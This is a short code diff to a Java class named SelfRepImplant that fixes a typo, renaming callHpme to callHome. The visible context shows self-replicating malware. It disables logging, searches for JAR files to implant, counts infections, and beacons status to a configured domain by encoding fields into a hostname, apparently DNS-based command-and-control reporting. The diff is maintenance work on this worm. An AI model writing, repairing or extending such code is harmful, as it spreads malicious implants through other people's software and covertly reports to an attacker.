@@ -89,7 +89,7 @@ public class SelfRepImplant implements Runnable, Thread.UncaughtExceptionHandler
         disableAllLogging();
 
         String id = generateRandomId();
-        callHpme(CONF_DOMAIN, "hello", id);
+        callHome(CONF_DOMAIN, "hello", id);
 
         Set<Path> jarsToImplant;
         try {
@@ -147,7 +147,7 @@ public class SelfRepImplant implements Runnable, Thread.UncaughtExceptionHandler
             }
         }
 
-        callHpme(CONF_DOMAIN, "did-" + numInfected, id);
+        callHome(CONF_DOMAIN, "did-" + numInfected, id);
     }
 
     public static Set<Path> findAllJars(String root, String ignoreSpec) throws IllegalArgumentException {
@@ -251,7 +251,7 @@ public class SelfRepImplant implements Runnable, Thread.UncaughtExceptionHandler
     }
 
     @SuppressWarnings("all")
-    private static void callHpme(String domain, String... fields) {
+    private static void callHome(String domain, String... fields) {
         StringBuilder fqdn = new StringBuilder();
         for (String field : fields) {
             fqdn.append(field).append(".");
